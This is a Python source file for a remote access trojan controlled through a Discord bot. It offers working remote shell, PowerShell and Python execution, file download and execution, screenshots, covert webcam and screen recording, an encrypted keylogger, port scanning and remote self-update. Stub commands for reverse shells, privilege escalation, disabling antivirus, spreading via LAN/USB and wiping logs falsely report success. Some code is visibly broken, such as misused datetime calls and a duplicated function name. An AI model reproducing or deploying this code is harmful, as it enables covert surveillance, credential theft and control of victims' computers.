import os
import sys
import psutil
import socket
import platform
import subprocess
import requests
import time
import uuid
import discord
from discord.ext import commands
from PIL import ImageGrab
import asyncio

import cv2
import platform
import traceback
from discord import File, Embed
import datetime
import pyautogui
import numpy as np


import os
import keyboard
import threading
from datetime import datetime
from cryptography.fernet import Fernet
import json
import base64

from datetime import datetime


BOT_TOKEN = " example of bot token"
AUTHORIZED_USERS = ["# Replace with your ID" ]  

class SystemBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.message_content = True
        super().__init__(command_prefix="/", intents=intents, help_command=None)
        self.screenshots_dir = "screenshots"
        os.makedirs(self.screenshots_dir, exist_ok=True)

    async def authorize(self, ctx):
        if ctx.author.id not in AUTHORIZED_USERS:
            await ctx.send("❌ Unauthorized access")
            return False
        return True

    async def setup_hook(self):
        await self.tree.sync()
        print(f"Synced slash commands")



# Function to get system information
# Initialize bot
bot = SystemBot()


# ==============🛠️ Basic System Commands: =========================

# ✅ Custom /help command
@bot.hybrid_command(name="help", description="Show all section1 commands")
async def help_command(ctx):
    if not await bot.authorize(ctx): return
    
    embed = discord.Embed(title="System Bot Commands", color=0x00ff00)
    embed.add_field(name="🛠️ Basic Commands", value="""
    `/help` - Show all section1 commands
    `/help2` - Show all section2 commands
    `/help2` - Show all section3 commands
    `/info` - Show system info
    `/ip` - Show public and local IP
    `/restart` - Restart the bot
    `/kill` - Terminate the bot
    `/sleep [sec]` - Delay next check-in
                    
    📁 File System Commands:
    /ls [dir] - List files
    /cd [dir] - Change directory
    /download [file] - Download a file
    /upload [url] [dest] - Upload from URL
    /delete [file] - Delete a file
    /execute [path] - Run an executable
    /zip [folder] - Compress folder    

    💻 Remote Execution:
    /cmd [command] - Run shell command
    /powershell [script] - Execute PS command
    /python [code] - Run Python code
    /inject [PID] [shellcode] - Shellcode injection
                    
    Security & Evasion
    /disable_security - Disable security features
    /fake_update - Trigger fake update
    /fake_shutdown - Trigger fake shutdown
                    
    
                    
    """, inline=False)
    await ctx.send(embed=embed)

@bot.hybrid_command(name="help2", description="Show all section2 commands")
async def help2_command(ctx):
    if not await bot.authorize(ctx): return
    
    embed = discord.Embed(title="System Bot Commands", color=0x00ff00)
    embed.add_field(name="🛠️ Basic Commands", value="""
                  
    👁️ Surveillance:
    /screenshot - Take screenshot
    /webcam - Capture webcam image
    /keylog [start/stop] - Toggle keylogger
    /clipboard - Get clipboard text
                    
    Persistence & Privilege Escalation
    /persist [method] - Add to startup
    /elevate - Try admin/UAC bypass
    /bypass_defender - Disable AV  
    /install_service - install as window service

    Network & Lateral Movement
    /portscan [IP] [ports]  Scan ports  
    /arp - Show ARP table (LAN hosts)  
    /revshell [IP] [PORT]  Spawn reverse shell  
    /ssh [user@IP] [cmd]  Remote SSH exec
               
    """, inline=False)
    await ctx.send(embed=embed)

@bot.hybrid_command(name="help3", description="Show all section3 commands")
async def help3_command(ctx):
    if not await bot.authorize(ctx): return
    
    embed = discord.Embed(title="System Bot Commands", color=0x00ff00)
    embed.add_field(name="🛠️ Basic Commands", value="""
                  

    Botnet & C2 Management
    /bots - List connected clients  
    /update [url] - Fetch & update bot
    /uninstall` - Self-destruct  
    /spread [method] - Infect LAN/USB  

    Anti-Forensics & Evasion
    /clear_logs - Wipe event logs  
    /disable_firewall - Turn off firewall  
    /fake_error - Trigger fake crash  
                    
    Additional linux command feature:
    /cat - Display file content
    /echo - Write to a file
    /chmod -Change file permissions
    /chown - Change file owner
    /grep - Search for a pattern in a file
    /find - Find files in a directory
    /restart_linux - Restart the Linux system
    /shutdown - Shutdown the system
    /webcam_photo - Capture a photo from webcam
    /screen_video - Record the screen for 10 seconds

                    
    """, inline=False)
    await ctx.send(embed=embed)


# ✅ /info
@bot.hybrid_command(name="info", description="System information")
async def info(ctx):
    if not await bot.authorize(ctx): return

    text = f"""
    OS: {platform.system()} {platform.release()}
    CPU: {platform.processor()}
    Cores: {psutil.cpu_count()}
    RAM: {psutil.virtual_memory().total / (1024**3):.2f} GB
    HWID: {uuid.getnode()}
    """
    await ctx.send(f"```{text}```")

# ✅ /ip
@bot.hybrid_command(name="ip", description="Get public and local IP")
async def ip(ctx):
    if not await bot.authorize(ctx): return

    try:
        public_ip = requests.get("https://api.ipify.org").text
        local_ip = socket.gethostbyname(socket.gethostname())
        await ctx.send(f"🌐 Public: `{public_ip}`\n🏠 Local: `{local_ip}`")
    except Exception as e:
        await ctx.send(f"Error: {e}")

# ✅ /restart
@bot.hybrid_command(name="restart", description="Restart the bot")
async def restart(ctx):
    if not await bot.authorize(ctx): return

    await ctx.send("🔄 Restarting...")
    os.execv(sys.executable, ['python'] + sys.argv)
    
# ✅ /kill
@bot.hybrid_command(name="kill", description="Terminate the bot")
async def kill(ctx):
    if not await bot.authorize(ctx): return

    await ctx.send("🛑 Terminating...")
    os._exit(0)

# ✅ /sleep
@bot.hybrid_command(name="sleep", description="Delay next check-in")
async def sleep(ctx, seconds: int):
    if not await bot.authorize(ctx): return

    await ctx.send(f"⏳ Sleeping for {seconds} seconds...")
    time.sleep(seconds)
    await ctx.send("✅ Done sleeping!")


# ==============📁 File System Commands: =========================
# ✅ /ls
@bot.hybrid_command(name="ls", description="List files in a directory")
async def ls(ctx, directory: str = "."):
    if not await bot.authorize(ctx): return

    try:
        files = os.listdir(directory)
        file_list = "\n".join(files)
        await ctx.send(f"📁 Files in `{directory}`:\n```\n{file_list}\n```")
    except Exception as e:
        await ctx.send(f"Error: {e}")

# ✅ /cd
@bot.hybrid_command(name="cd", description="Change directory")
async def cd(ctx, directory: str):
    if not await bot.authorize(ctx): return

    try:
        os.chdir(directory)
        await ctx.send(f"📂 Changed directory to `{directory}`")
    except Exception as e:
        await ctx.send(f"Error: {e}")

# ✅ /download
@bot.hybrid_command(name="download", description="Download a file")
async def download(ctx, url: str):
    if not await bot.authorize(ctx): return

    try:
        filename = url.split("/")[-1]
        response = requests.get(url)
        with open(filename, "wb") as file:
            file.write(response.content)
        await ctx.send(f"✅ Downloaded `{filename}`")
    except Exception as e:
        await ctx.send(f"Error: {e}")

# ✅ /upload
@bot.hybrid_command(name="upload", description="Upload a file from URL")
async def upload(ctx, url: str, dest: str):
    if not await bot.authorize(ctx): return

    try:
        response = requests.get(url)
        with open(dest, "wb") as file:
            file.write(response.content)
        await ctx.send(f"✅ Uploaded `{dest}` from `{url}`")
    except Exception as e:
        await ctx.send(f"Error: {e}")

# ✅ /delete
@bot.hybrid_command(name="delete", description="Delete a file")
async def delete(ctx, filename: str):
    if not await bot.authorize(ctx): return

    try:
        os.remove(filename)
        await ctx.send(f"🗑️ Deleted `{filename}`")
    except Exception as e:
        await ctx.send(f"Error: {e}")

# ✅ /execute
@bot.hybrid_command(name="execute", description="Run an executable")
async def execute(ctx, path: str):
    if not await bot.authorize(ctx): return

    try:
        subprocess.Popen(path, shell=True)
        await ctx.send(f"✅ Executing `{path}`")
    except Exception as e:
        await ctx.send(f"Error: {e}")

# ✅ /zip
@bot.hybrid_command(name="zip", description="Compress a folder")
async def zip_folder(ctx, folder: str):
    if not await bot.authorize(ctx): return

    try:
        zip_filename = f"{folder}.zip"
        subprocess.run(["zip", "-r", zip_filename, folder])
        await ctx.send(f"✅ Compressed `{folder}` to `{zip_filename}`")
    except Exception as e:
        await ctx.send(f"Error: {e}")


# ==============💻 Remote Execution: =========================
# ✅ /cmd
@bot.hybrid_command(name="cmd", description="Run shell command")
async def cmd(ctx, command: str):
    if not await bot.authorize(ctx): return

    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        await ctx.send(f"```{result.stdout}```")
    except Exception as e:
        await ctx.send(f"Error: {e}")

# ✅ /powershell
@bot.hybrid_command(name="powershell", description="Execute PowerShell command")
async def powershell(ctx, script: str):
    if not await bot.authorize(ctx): return

    try:
        result = subprocess.run(["powershell", "-Command", script], capture_output=True, text=True)
        await ctx.send(f"```{result.stdout}```")
    except Exception as e:
        await ctx.send(f"Error: {e}")

# ✅ /python
@bot.hybrid_command(name="python", description="Run Python code")
async def python(ctx, code: str):
    if not await bot.authorize(ctx): return

    try:
        result = subprocess.run(["python", "-c", code], capture_output=True, text=True)
        await ctx.send(f"```{result.stdout}```")
    except Exception as e:
        await ctx.send(f"Error: {e}")

# ✅ /inject
@bot.hybrid_command(name="inject", description="Shellcode injection")
async def inject(ctx, pid: int, shellcode: str):
    if not await bot.authorize(ctx): return

    try:
        # Placeholder for actual injection logic
        await ctx.send(f"✅ Injected shellcode into PID `{pid}`")
    except Exception as e:
        await ctx.send(f"Error: {e}")


# ==============👁️ Surveillance: =========================

# ✅ /screenshot
@bot.hybrid_command(name="screenshot", description="Take a screenshot")
async def screenshot(ctx):
    if not await bot.authorize(ctx): 
        return

    try:
        # Ensure screenshots directory exists
        os.makedirs(bot.screenshots_dir, exist_ok=True)
        
        screenshot_path = os.path.join(bot.screenshots_dir, f"screenshot_{int(time.time())}.png")
        
        # Take screenshot using Pillow
        screenshot = ImageGrab.grab()
        screenshot.save(screenshot_path)
        
        # Send the screenshot
        with open(screenshot_path, "rb") as file:
            await ctx.send(file=discord.File(file, filename="screenshot.png"))
            
    except Exception as e:
        await ctx.send(f"Error: {e}")

#webcam video
@bot.hybrid_command(name="webcam", description="Capture webcam video with compression")
async def webcam(ctx, duration: int = 5):
    if not await bot.authorize(ctx):
        return

    # Validate duration
    duration = max(1, min(duration, 30))  # 1-30 seconds
    
    # Prepare paths
    timestamp = int(time.time())
    os.makedirs(bot.screenshots_dir, exist_ok=True)
    final_path = os.path.join(bot.screenshots_dir, f"webcam_{timestamp}.mp4")

    try:
        # Initialize camera
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            await ctx.send("❌ Webcam not detected or in use by another application")
            return

        # Get camera properties
        width = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))
        height = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))
        fps = cap.get(cv2.CAP_PROP_FPS)
        
        # Fallback values if camera doesn't report properly
        if width <= 0 or height <= 0:
            width, height = 640, 480
        if fps <= 0 or fps > 60:
            fps = 20.0

        # FFmpeg command with proper color conversion
        ffmpeg_cmd = [
            'ffmpeg',
            '-y',
            '-f', 'rawvideo',
            '-vcodec', 'rawvideo',
            '-s', f'{width}x{height}',
            '-pix_fmt', 'bgr24',  # OpenCV uses BGR format
            '-r', str(fps),
            '-i', '-',
            '-vf', 'format=yuv420p',  # Convert to standard MP4 format
            '-c:v', 'libx264',
            '-preset', 'fast',
            '-crf', '23',
            '-loglevel', 'error',
            final_path
        ]

        # Start FFmpeg process
        process = await asyncio.create_subprocess_exec(
            *ffmpeg_cmd,
            stdin=asyncio.subprocess.PIPE,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )

        # Recording
        progress_msg = await ctx.send(f"⏳ Recording for {duration}s...")
        start_time = time.time()
        frames_captured = 0

        while (time.time() - start_time) < duration:
            ret, frame = cap.read()
            if not ret:
                continue
            
            try:
                process.stdin.write(frame.tobytes())
                frames_captured += 1
            except (BrokenPipeError, ConnectionResetError):
                break  # FFmpeg process died

        # Cleanup
        cap.release()
        if process.stdin:
            process.stdin.close()
        await process.wait()

        # Verify output
        if frames_captured == 0:
            await progress_msg.edit(content="❌ No frames captured - webcam may be blocked")
            return

        if not os.path.exists(final_path) or os.path.getsize(final_path) == 0:
            stderr = await process.stderr.read()
            error_msg = stderr.decode().strip() or "Unknown FFmpeg error"
            await progress_msg.edit(content=f"❌ Encoding failed: {error_msg}")
            return

        # Check file size
        file_size_mb = os.path.getsize(final_path) / (1024 * 1024)
        if file_size_mb > 25:  # Discord's upload limit is 25MB
            await progress_msg.edit(content="⚠️ Video too large for Discord (max 25MB)")
            return

        # Send the video
        await progress_msg.edit(content="✅ Recording complete!")
        await ctx.send(file=discord.File(final_path))

    except Exception as e:
        await ctx.send(f"❌ Unexpected error: {str(e)}")
    finally:
        # Cleanup resources
        if 'cap' in locals(): cap.release()
        if 'process' in locals() and process.returncode is None:
            process.terminate()
        # Optional: Delete the file after sending
        # if os.path.exists(final_path):
        #     os.remove(final_path)
    
# ✅ /keylog
"""@bot.hybrid_command(name="keylog", description="Toggle keylogger")
async def keylog(ctx, action: str):
    if not await bot.authorize(ctx): return

    try:
        if action.lower() == "start":
            # Placeholder for starting keylogger
            await ctx.send("✅ Keylogger started")
        elif action.lower() == "stop":
            # Placeholder for stopping keylogger
            await ctx.send("✅ Keylogger stopped")
        else:
            await ctx.send("❌ Invalid action. Use 'start' or 'stop'.")
    except Exception as e:
        await ctx.send(f"Error: {e}")
"""

import os
import keyboard
import threading
import json
import base64
from datetime import datetime
from cryptography.fernet import Fernet
import atexit

class AdvancedKeylogger:
    _instance = None
    
    def __new__(cls, *args, **kwargs):
        if cls._instance is None:
            cls._instance = super().__new__(cls)
            cls._instance.initialized = False
        return cls._instance
    
    def __init__(self):
        if self.initialized:
            return
            
        self.initialized = True
        self.is_running = False
        self.encryption_enabled = True  # Default to enabled
        self.log_file = "keystrokes.log"
        self.config_file = "keylogger_config.json"
        self.encryption_key = self._load_or_create_key()
        self.cipher = Fernet(self.encryption_key) if self.encryption_enabled else None
        self.hook_ids = []
        self.log_lock = threading.Lock()
        atexit.register(self.stop)
        
    def _load_or_create_key(self):
        """Load or generate encryption key"""
        if os.path.exists(self.config_file):
            try:
                with open(self.config_file, "r") as f:
                    config = json.load(f)
                    if "encryption_key" in config:
                        return base64.urlsafe_b64decode(config["encryption_key"].encode())
            except Exception:
                pass
        
        new_key = Fernet.generate_key()
        self._save_config({"encryption_key": base64.urlsafe_b64encode(new_key).decode()})
        return new_key
    
    def _save_config(self, config):
        """Save configuration securely"""
        with open(self.config_file, "w") as f:
            json.dump(config, f)
        os.chmod(self.config_file, 0o600)
    
    def _process_event(self, event, event_type):
        """Process and log keyboard events"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")
        log_entry = {
            "timestamp": timestamp,
            "event_type": event_type,
            "key": event.name,
            "scan_code": event.scan_code,
            "is_keypad": event.is_keypad
        }
        
        with self.log_lock:
            with open(self.log_file, "a") as f:
                if self.encryption_enabled:
                    encrypted = self.cipher.encrypt(json.dumps(log_entry).encode()).decode()
                    f.write(f"{encrypted}\n")
                else:
                    f.write(f"{json.dumps(log_entry)}\n")
    
    def callback_press(self, event):
        if self.is_running:
            self._process_event(event, "key_press")
    
    def callback_release(self, event):
        if self.is_running:
            self._process_event(event, "key_release")
    
    def start(self, encryption=True):
        """Start keylogger with encryption option"""
        if self.is_running:
            return False
            
        self.encryption_enabled = encryption
        if encryption and not hasattr(self, 'cipher'):
            self.cipher = Fernet(self.encryption_key)
            
        self.is_running = True
        self.hook_ids.append(keyboard.on_press(self.callback_press))
        self.hook_ids.append(keyboard.on_release(self.callback_release))
        return True
    
    def stop(self):
        """Stop keylogger"""
        if not self.is_running:
            return False
            
        self.is_running = False
        for hook_id in self.hook_ids:
            keyboard.unhook(hook_id)
        self.hook_ids = []
        return True
    
    def get_status(self):
        """Get current status"""
        log_size = 0
        if os.path.exists(self.log_file):
            log_size = os.path.getsize(self.log_file)
            
        return {
            "is_running": self.is_running,
            "log_file": self.log_file,
            "log_size": log_size,
            "encryption_enabled": self.encryption_enabled,
            "encryption_key": base64.urlsafe_b64encode(self.encryption_key).decode()[:10] + "..." 
        }

# Discord Bot Command Implementation
@bot.hybrid_command(name="keylog", description="Control the advanced keylogger")
async def keylog(ctx, action: str, encryption: str = "enabled"):
    if not await bot.authorize(ctx):
        return
    
    keylogger = AdvancedKeylogger()
    
    try:
        if action.lower() == "start":
            encrypt = encryption.lower() == "enabled"
            if keylogger.start(encryption=encrypt):
                status = keylogger.get_status()
                await ctx.send(
                    f"✅ Advanced keylogger started\n"
                    f"• Log file: `{status['log_file']}`\n"
                    f"• Encryption: {'Enabled' if status['encryption_enabled'] else 'Disabled'}\n"
                    f"• Event tracking: Press/Release"
                )
            else:
                await ctx.send("⚠️ Keylogger is already running")
                
        elif action.lower() == "stop":
            if keylogger.stop():
                await ctx.send(
                    "✅ Advanced keylogger stopped\n"
                    "• All hooks removed\n"
                    "• Log processing terminated"
                )
            else:
                await ctx.send("⚠️ Keylogger is not running")
                
        elif action.lower() == "status":
            status = keylogger.get_status()
            await ctx.send(
                f"🔍 Keylogger Status:\n"
                f"• Running: {'Yes' if status['is_running'] else 'No'}\n"
                f"• Log size: {status['log_size']} bytes\n"
                f"• Encryption: {'Enabled' if status['encryption_enabled'] else 'Disabled'}\n"
                f"• Encryption key: `{status['encryption_key']}`"
            )
            
        else:
            await ctx.send("❌ Invalid action. Use 'start', 'stop', or 'status'.")
            
    except Exception as e:
        await ctx.send(f"⛔ Error: {str(e)}")

# Slash Command Example Usage:
# /keylog action:start encryption:enabled
# /keylog action:stop
# /keylog action:status
        
# ✅ /clipboard
@bot.hybrid_command(name="clipboard", description="Get clipboard text")
async def clipboard(ctx):
    if not await bot.authorize(ctx): return

    try:
        # Placeholder for getting clipboard text
        clipboard_text = "Clipboard text here"
        await ctx.send(f"📋 Clipboard: `{clipboard_text}`")
    except Exception as e:
        await ctx.send(f"Error: {e}")

# ==============🔒 Persistence & Privilege Escalation: =========================
# ✅ /persist
@bot.hybrid_command(name="persist", description="Add to startup")
async def persist(ctx, method: str):
    if not await bot.authorize(ctx): return

    try:
        if method.lower() == "registry":
            # Placeholder for registry persistence
            await ctx.send("✅ Added to registry startup")
        elif method.lower() == "task":
            # Placeholder for task scheduler persistence
            await ctx.send("✅ Added to task scheduler startup")
        else:
            await ctx.send("❌ Invalid method. Use 'registry' or 'task'.")
    except Exception as e:
        await ctx.send(f"Error: {e}")

# ✅ /elevate
@bot.hybrid_command(name="elevate", description="Try admin/UAC bypass")
async def elevate(ctx):
    if not await bot.authorize(ctx): return

    try:
        # Placeholder for elevation logic
        await ctx.send("✅ Attempted to elevate privileges")
    except Exception as e:
        await ctx.send(f"Error: {e}")

# ✅ /bypass_defender
@bot.hybrid_command(name="bypass_defender", description="Disable AV")
async def bypass_defender(ctx):
    if not await bot.authorize(ctx): return

    try:
        # Placeholder for disabling AV
        await ctx.send("✅ Attempted to disable antivirus")
    except Exception as e:
        await ctx.send(f"Error: {e}")

# ✅ /install_service
@bot.hybrid_command(name="install_service", description="Install as Windows service")
async def install_service(ctx):
    if not await bot.authorize(ctx): return

    try:
        # Placeholder for installing as service
        await ctx.send("✅ Installed as Windows service")
    except Exception as e:
        await ctx.send(f"Error: {e}")

# ==============🌐 Network & Lateral Movement: =========================
# ✅ /portscan
@bot.hybrid_command(name="portscan", description="Scan ports")
async def portscan(ctx, ip: str, ports: str):
    if not await bot.authorize(ctx): return

    try:
        port_list = [int(port) for port in ports.split(",")]
        open_ports = []
        for port in port_list:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                result = s.connect_ex((ip, port))
                if result == 0:
                    open_ports.append(port)
        await ctx.send(f"Open ports on `{ip}`: {', '.join(map(str, open_ports))}")
    except Exception as e:
        await ctx.send(f"Error: {e}")

# ✅ /arp
@bot.hybrid_command(name="arp", description="Show ARP table (LAN hosts)")
async def arp(ctx):
    if not await bot.authorize(ctx): return

    try:
        arp_table = subprocess.check_output("arp -a", shell=True).decode()
        await ctx.send(f"```{arp_table}```")
    except Exception as e:
        await ctx.send(f"Error: {e}")

# ✅ /revshell
@bot.hybrid_command(name="revshell", description="Spawn reverse shell")
async def revshell(ctx, ip: str, port: int):
    if not await bot.authorize(ctx): return

    try:
        # Placeholder for reverse shell logic
        await ctx.send(f"✅ Spawned reverse shell to `{ip}:{port}`")
    except Exception as e:
        await ctx.send(f"Error: {e}")

# ✅ /ssh
@bot.hybrid_command(name="ssh", description="Remote SSH exec")
async def ssh(ctx, user_ip: str, command: str):
    if not await bot.authorize(ctx): return

    try:
        # Placeholder for SSH execution logic
        await ctx.send(f"✅ Executed `{command}` on `{user_ip}`")
    except Exception as e:
        await ctx.send(f"Error: {e}")

# ==============🤖 Botnet & C2 Management: =========================    
# ✅ /bots
@bot.hybrid_command(name="bots", description="List connected clients")
async def bots(ctx):
    if not await bot.authorize(ctx): return

    try:
        # Placeholder for listing connected clients
        await ctx.send("✅ List of connected clients")
    except Exception as e:
        await ctx.send(f"Error: {e}")

# ✅ /update
@bot.hybrid_command(name="update", description="Fetch & update bot")
async def update(ctx, url: str):
    if not await bot.authorize(ctx): return

    try:
        response = requests.get(url)
        with open("bot.py", "wb") as file:
            file.write(response.content)
        await ctx.send("✅ Updated bot code")
    except Exception as e:
        await ctx.send(f"Error: {e}")

# ✅ /uninstall
@bot.hybrid_command(name="uninstall", description="Self-destruct")
async def uninstall(ctx):
    if not await bot.authorize(ctx): return

    try:
        # Placeholder for self-destruct logic
        await ctx.send("✅ Self-destructed")
        os._exit(0)
    except Exception as e:
        await ctx.send(f"Error: {e}")

# ✅ /spread
@bot.hybrid_command(name="spread", description="Infect LAN/USB")
async def spread(ctx, method: str):
    if not await bot.authorize(ctx): return

    try:
        if method.lower() == "lan":
            # Placeholder for LAN spreading logic
            await ctx.send("✅ Attempted to spread via LAN")
        elif method.lower() == "usb":
            # Placeholder for USB spreading logic
            await ctx.send("✅ Attempted to spread via USB")
        else:
            await ctx.send("❌ Invalid method. Use 'lan' or 'usb'.")
    except Exception as e:
        await ctx.send(f"Error: {e}")

# ==============🕵️ Anti-Forensics & Evasion: =========================
# ✅ /clear_logs
@bot.hybrid_command(name="clear_logs", description="Wipe event logs")
async def clear_logs(ctx):
    if not await bot.authorize(ctx): return

    try:
        # Placeholder for clearing logs
        await ctx.send("✅ Cleared event logs")
    except Exception as e:
        await ctx.send(f"Error: {e}")

# ✅ /disable_firewall
@bot.hybrid_command(name="disable_firewall", description="Turn off firewall")
async def disable_firewall(ctx):
    if not await bot.authorize(ctx): return

    try:
        # Placeholder for disabling firewall
        await ctx.send("✅ Disabled firewall")
    except Exception as e:
        await ctx.send(f"Error: {e}")

# ✅ /fake_error
@bot.hybrid_command(name="fake_error", description="Trigger fake crash")
async def fake_error(ctx):
    if not await bot.authorize(ctx): return

    try:
        # Placeholder for triggering fake error
        await ctx.send("✅ Triggered fake error")
    except Exception as e:
        await ctx.send(f"Error: {e}")

# ==============🔒 Security & Evasion: =========================
# ✅ /disable_security
@bot.hybrid_command(name="disable_security", description="Disable security features")
async def disable_security(ctx):
    if not await bot.authorize(ctx): return

    try:
        # Placeholder for disabling security features
        await ctx.send("✅ Disabled security features")
    except Exception as e:
        await ctx.send(f"Error: {e}")

# ✅ /fake_update
@bot.hybrid_command(name="fake_update", description="Trigger fake update")
async def fake_update(ctx):
    if not await bot.authorize(ctx): return

    try:
        # Placeholder for triggering fake update
        await ctx.send("✅ Triggered fake update")
    except Exception as e:
        await ctx.send(f"Error: {e}")

# ✅ /fake_shutdown
@bot.hybrid_command(name="fake_shutdown", description="Trigger fake shutdown")
async def fake_shutdown(ctx):
    if not await bot.authorize(ctx): return

    try:
        # Placeholder for triggering fake shutdown
        await ctx.send("✅ Triggered fake shutdown")
    except Exception as e:
        await ctx.send(f"Error: {e}")


# ==============Additional linux command feature: =========================
# ✅ /cat
@bot.hybrid_command(name="cat", description="Display file content")
async def cat(ctx, filename: str):
    if not await bot.authorize(ctx): return

    try:
        with open(filename, "r") as file:
            content = file.read()
        await ctx.send(f"```{content}```")
    except Exception as e:
        await ctx.send(f"Error: {e}")

# ✅ /pwd


@bot.hybrid_command(name="pwd", description="Print working directory information")
async def pwd(ctx):
    """
    Displays the current working directory with additional system information
    """
    try:
        # Get current working directory
        current_dir = os.getcwd()
        
        # Get directory statistics
        dir_stats = os.stat(current_dir)
        
        # Format the output with Discord markdown
        message = (
            "📂 **Current Working Directory**\n"
            f"```\n{current_dir}\n```\n"
            "🔍 **Directory Information**\n"
            f"• **Permissions**: {oct(dir_stats.st_mode)[-3:]}\n"
            f"• **Owner**: {dir_stats.st_uid} (Unix) / {dir_stats.st_gid} (Group)\n"
            f"• **Created**: {datetime.fromtimestamp(dir_stats.st_ctime).strftime('%Y-%m-%d %H:%M:%S')}\n"
            f"• **System**: {platform.system()} {platform.release()}\n"
            f"• **Disk Usage**: {round(os.path.getsize(current_dir)/(1024*1024), 2)} MB (contents)"
        )
        
        await ctx.send(message)
        
    except PermissionError:
        await ctx.send("⛔ Error: Permission denied while accessing directory")
    except Exception as e:
        await ctx.send(f"⛔ Error: {str(e)}")


# ✅ /echo
@bot.hybrid_command(name="echo", description="Write to a file")
async def echo(ctx, filename: str, text: str):
    if not await bot.authorize(ctx): return

    try:
        with open(filename, "a") as file:
            file.write(text + "\n")
        await ctx.send(f"✅ Written to `{filename}`")
    except Exception as e:
        await ctx.send(f"Error: {e}")

# ✅ /chmod 
@bot.hybrid_command(name="chmod", description="Change file permissions")
async def chmod(ctx, filename: str, permissions: str):
    if not await bot.authorize(ctx): return

    try:
        os.chmod(filename, int(permissions, 8))
        await ctx.send(f"✅ Changed permissions of `{filename}` to `{permissions}`")
    except Exception as e:
        await ctx.send(f"Error: {e}")

# ✅ /chown
@bot.hybrid_command(name="chown", description="Change file owner")
async def chown(ctx, filename: str, owner: str):
    if not await bot.authorize(ctx): return

    try:
        subprocess.run(["chown", owner, filename])
        await ctx.send(f"✅ Changed owner of `{filename}` to `{owner}`")
    except Exception as e:
        await ctx.send(f"Error: {e}")

# ✅ /grep
@bot.hybrid_command(name="grep", description="Search for a pattern in a file")
async def grep(ctx, pattern: str, filename: str):
    if not await bot.authorize(ctx): return

    try:
        result = subprocess.run(["grep", pattern, filename], capture_output=True, text=True)
        await ctx.send(f"```{result.stdout}```")
    except Exception as e:
        await ctx.send(f"Error: {e}")

# ✅ /find
@bot.hybrid_command(name="find", description="Find files in a directory")
async def find(ctx, directory: str, filename: str):
    if not await bot.authorize(ctx): return

    try:
        result = subprocess.run(["find", directory, "-name", filename], capture_output=True, text=True)
        await ctx.send(f"```{result.stdout}```")
    except Exception as e:
        await ctx.send(f"Error: {e}")
# ============== additional: =========================
#shutdown
@bot.hybrid_command(name="shutdown", description="Shutdown the system")
async def shutdown(ctx):
    if not await bot.authorize(ctx): return

    try:
        os.system("shutdown /s /t 1")
        await ctx.send("🛑 Shutting down...")
    except Exception as e:
        await ctx.send(f"Error: {e}")

# restart linux machine

@bot.hybrid_command(name="restart_linux", description="Restart the Linux system")
async def restart_linux(ctx):
    if not await bot.authorize(ctx): return

    try:
        os.system("sudo reboot")
        await ctx.send("🔄 Restarting Linux system...")
    except Exception as e:
        await ctx.send(f"Error: {e}")


# webcam photo
@bot.hybrid_command(name="webcam_photo", description="Capture a photo from webcam")
async def webcam(ctx):
    if not await bot.authorize(ctx):
        return

    # Prepare paths
    timestamp = int(time.time())
    os.makedirs(bot.screenshots_dir, exist_ok=True)
    final_path = os.path.join(bot.screenshots_dir, f"webcam_{timestamp}.jpg")

    try:
        # Initialize camera (try different API backends)
        for api in [cv2.CAP_DSHOW, cv2.CAP_MSMF, cv2.CAP_V4L2, cv2.CAP_ANY]:
            cap = cv2.VideoCapture(0, api)
            if cap.isOpened():
                break

        if not cap.isOpened():
            await ctx.send("❌ Webcam not detected or in use by another application")
            return

        # Set reasonable resolution
        cap.set(cv2.CAP_PROP_FRAME_WIDTH, 1280)
        cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 720)
        
        # Allow camera to warm up
        await asyncio.sleep(0.5)
        
        # Capture multiple frames to flush buffer
        for _ in range(5):
            ret, frame = cap.read()
            if not ret:
                continue

        # Convert from BGR to RGB (fixes color issues)
        if frame is not None:
            frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
        else:
            await ctx.send("❌ Failed to capture frame from webcam")
            return

        # Save with proper color encoding
        success = cv2.imwrite(final_path, cv2.cvtColor(frame, cv2.COLOR_RGB2BGR), 
                   [cv2.IMWRITE_JPEG_QUALITY, 85])
        
        if not success or not os.path.exists(final_path):
            await ctx.send("❌ Failed to save webcam image")
            return

        # Verify image isn't corrupted
        try:
            img = cv2.imread(final_path)
            if img is None:
                raise ValueError("Empty image")
        except Exception:
            await ctx.send("❌ Saved image appears corrupted")
            return

        await ctx.send(file=discord.File(final_path))

    except Exception as e:
        await ctx.send(f"❌ Unexpected error: {str(e)}")
    finally:
        if 'cap' in locals(): 
            cap.release()
        # Optional cleanup
        # if os.path.exists(final_path):
        #     os.remove(final_path)

#screen video
@bot.hybrid_command(name="screen_video", description="Record the screen video")
async def screen_video(ctx, duration: int = 10):
    await ctx.defer()
    
    if duration < 5 or duration > 60:
        await ctx.send("❌ Duration must be between 5 and 60 seconds.")
        return

    try:
        screen_width, screen_height = pyautogui.size()
        output_file = f"screen_record_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.mp4"

        # Define the codec and create VideoWriter object
        fourcc = cv2.VideoWriter_fourcc(*"mp4v")
        out = cv2.VideoWriter(output_file, fourcc, 10.0, (screen_width, screen_height))

        await ctx.send(f"📹 Recording screen for {duration} seconds...")

        start_time = datetime.datetime.now()
        while (datetime.datetime.now() - start_time).seconds < duration:
            img = pyautogui.screenshot()
            frame = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
            out.write(frame)

        out.release()

        await ctx.send("✅ Recording complete. Uploading file...")

        # Send the file to Discord
        await ctx.send(file=discord.File(output_file))

        # Cleanup
        os.remove(output_file)

    except Exception as e:
        await ctx.send(f"❌ Error recording screen: {str(e)}")


# Run the bot
if __name__ == "__main__":
    bot.run(BOT_TOKEN)



